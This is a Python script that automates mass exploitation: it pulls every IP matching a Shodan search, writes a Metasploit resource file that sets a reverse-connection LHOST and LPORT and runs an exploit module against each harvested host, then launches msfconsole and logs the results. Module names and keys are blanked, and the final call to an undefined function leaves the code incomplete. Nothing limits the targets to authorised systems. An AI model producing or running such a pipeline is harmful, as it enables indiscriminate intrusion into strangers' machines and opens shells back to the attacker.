import shodan
import os
import re

# Add your Shodan API key here
SHODAN_API_KEY = 'xxxx'
search_query = 'xxxx'
output_file = 'shodanaux_ips.txt'
lhost = 'xxxx'  # Enter your own LHOST IP address here
lport = xxxx  # Enter the LPORT number you want to use here

# Shodan API client
api = shodan.Shodan(SHODAN_API_KEY)

try:
    # Execute the search query
    results = api.search(search_query)
    
    # Open the file to write the IP addresses
    with open(output_file, 'w') as file:
        # Process each result and write the IP address to the file
        for result in results['matches']:
            ip = result['ip_str']
            file.write(ip + '\n')
    
    print(f"Total of {len(results['matches'])} IP addresses written to {output_file}.")

except shodan.APIError as e:
    print(f"Shodan API error: {e}")

# Create Metasploit resource file
with open('msf_resource.rc', 'w') as file:
    file.write('search XXXX\n')
    file.write('use XXXX\n')  # Use the full module name
    file.write(f'set lhost {lhost}\n')  # Set the LHOST IP address
    file.write(f'set lport {lport}\n')  # Set the LPORT number
    
    # Increase the timeout duration (e.g., 300 seconds)
    file.write('set SMBReadTimeout 300\n')
    
    # Read the IP addresses from shodanaux_ips.txt file and set rhosts for each
    with open('shodanaux_ips.txt', 'r') as ip_file:
        for ip in ip_file:
            file.write(f'set rhosts {ip.strip()}\n')
            file.write('run\n')

print("Metasploit resource file 'msf_resource.rc' created.")

# Run the Metasploit resource file and save the output
os.system('msfconsole -r msf_resource.rc | tee msf_output.txt')

# Process the output and save the sensitive IPs
process_msf_output('msf_output.txt')
